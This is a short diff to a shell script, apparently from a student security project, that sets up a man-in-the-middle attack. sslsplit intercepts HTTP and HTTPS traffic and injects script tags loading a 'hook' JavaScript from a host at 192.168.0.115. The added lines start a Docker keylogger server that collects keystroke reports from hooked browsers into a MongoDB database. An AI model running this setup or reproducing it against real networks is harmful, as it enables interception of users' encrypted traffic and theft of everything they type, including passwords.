@@ -18,3 +18,8 @@ export HOOK_HOST=192.168.0.115
 export HOOK_PORT_HTTP=80
 export HOOK_PORT_HTTPS=443
 sudo ./sslsplit -D -k "$PRIVATE_KEY" -c "$CERTIFICATE" -K "$PRIVATE_KEY" -I "<script src='http://$HOOK_HOST:$HOOK_PORT_HTTP/hook' type='text/javascript'></script>" -I  "<script src='https://$HOOK_HOST:$HOOK_PORT_HTTPS/hook' type='text/javascript'></script>" https 0.0.0.0 8443 http 0.0.0.0 8080
+
+# Spustenie docker kontajneru s keylog serverom.
+#	--hook_host - specifikuje kam sa budu zasielat reporty od klientov (vo vacsine pripadov adresa serveru kde bezi keylogger)
+#	--db - adresa MongoDb serveru
+docker run -it -p 80:80 -p 443:443 -p 7000:7000 pds_keylogger --workers_num=4 --hook_host=192.168.0.115 --db=192.168.0.116
